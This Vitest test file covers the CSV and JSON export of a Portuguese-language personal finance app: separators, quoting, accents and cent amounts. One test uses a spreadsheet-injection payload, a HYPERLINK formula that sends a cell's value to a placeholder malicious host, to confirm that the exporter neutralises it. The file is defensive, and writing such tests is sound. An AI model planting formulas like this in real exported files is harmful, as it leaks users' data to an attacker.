import { describe, expect, it } from 'vitest';
import { exportRows, fileNameFor, mimeFor, toCsv, toJson } from '@/lib/export';
import type { FinanceTransaction } from '@/lib/types';

/**
 * Exportação: o arquivo tem de abrir no Excel em português **e** servir para
 * integrar. Os dois casos que quebram na prática: separador de coluna e
 * acentuação.
 */
const row = {
  date: '2026-11-25',
  competenceDate: '2026-11-25',
  description: 'Mercado',
  category: 'Alimentação',
  account: 'Corrente',
  type: 'expense',
  status: 'paid',
  amountCents: '-12590',
  dueDate: '',
  paidAt: '',
};

describe('toCsv', () => {
  it('neutraliza fórmula de planilha na descrição (CSV injection)', () => {
    // Sem o prefixo, o Excel executa a fórmula ao abrir o arquivo exportado.
    const malicious = {
      ...row,
      description: '=HYPERLINK("http://malicioso/?d="&A2,"clique")',
    };
    const csv = toCsv([malicious]);
    const line = csv.split('\r\n')[2];

    expect(line).toContain(`"'=HYPERLINK`);
    // A célula não começa com `=` (nem entre aspas): a fórmula não executa.
    expect(line.split(';')[2]).not.toMatch(/^"?=/);
  });

  it('neutraliza também +, - e @ no início de qualquer campo', () => {
    const csv = toCsv([{ ...row, category: '@SUM(A1:A9)', account: '-2+3' }]);
    const line = csv.split('\r\n')[2];

    expect(line).toContain("'@SUM(A1:A9)");
    expect(line).toContain("'-2+3");
  });

  it('não altera texto normal', () => {
    const csv = toCsv([{ ...row, description: 'Mercado do bairro' }]);

    expect(csv.split('\r\n')[2]).toContain('Mercado do bairro');
  });

  it('usa ponto e vírgula e a diretiva sep= para o Excel em pt-BR', () => {
    const csv = toCsv([row]);
    const [first, second] = csv.split('\r\n');

    expect(first).toBe('sep=;');
    expect(second).toContain('Descrição;');
    expect(second.split(';')).toHaveLength(10);
  });

  it('aspas só quando o campo precisa (separador, aspas ou quebra de linha)', () => {
    const csv = toCsv([{ ...row, description: 'Padaria; café' }, row]);
    const lines = csv.split('\r\n');

    expect(lines[2]).toContain('"Padaria; café"');
    // Sem separador, o campo fica limpo — nada de aspas em todo mundo.
    expect(lines[3]).toContain(';Mercado;');
  });

  it('duplica aspas internas (CSV válido)', () => {
    const csv = toCsv([{ ...row, description: 'Café "do bem"' }]);

    expect(csv).toContain('"Café ""do bem"""');
  });

  it('mantém a centavos como string, com sinal', () => {
    const csv = toCsv([row]);

    expect(csv).toContain('-12590');
    expect(csv).not.toContain('-125.9');
  });
});

describe('toJson', () => {
  it('inclui versão do schema e contagem', () => {
    const parsed = JSON.parse(toJson([row]));

    expect(parsed.schema).toBe('meufinanceiro.transactions.v1');
    expect(parsed.count).toBe(1);
    expect(parsed.rows[0].amountCents).toBe('-12590');
  });
});

describe('exportRows', () => {
  it('resolve categoria e conta e completa campos opcionais', () => {
    const transactions: FinanceTransaction[] = [
      {
        id: 'tx-1',
        accountId: 'acc-1',
        categoryId: 'cat-1',
        description: 'Mercado',
        amountCents: '-12590',
        type: 'expense',
        origin: 'manual',
        date: '2026-11-25',
        createdAt: '2026-11-25T12:00:00Z',
      },
    ];

    const rows = exportRows(
      transactions,
      () => 'Alimentação',
      () => 'Corrente'
    );

    expect(rows[0]).toMatchObject({
      category: 'Alimentação',
      account: 'Corrente',
      status: 'paid',
      competenceDate: '2026-11-25',
      dueDate: '',
      paidAt: '',
    });
  });

  it('sem categoria, o campo fica vazio (não "undefined")', () => {
    const rows = exportRows(
      [
        {
          id: 'tx-1',
          accountId: 'acc-1',
          categoryId: null,
          description: 'Mercado',
          amountCents: '-1',
          type: 'expense',
          origin: 'manual',
          date: '2026-11-25',
          createdAt: '2026-11-25T12:00:00Z',
        },
      ],
      () => 'nunca chamado',
      () => 'Corrente'
    );

    expect(rows[0].category).toBe('');
  });
});

describe('nome e tipo de arquivo', () => {
  it('muda a extensão e o mime conforme o formato', () => {
    expect(fileNameFor('csv', '2026-11')).toBe('lancamentos-2026-11.csv');
    expect(fileNameFor('json', '2026-11')).toBe('lancamentos-2026-11.json');
    expect(mimeFor('csv')).toContain('text/csv');
    expect(mimeFor('json')).toContain('application/json');
  });
});
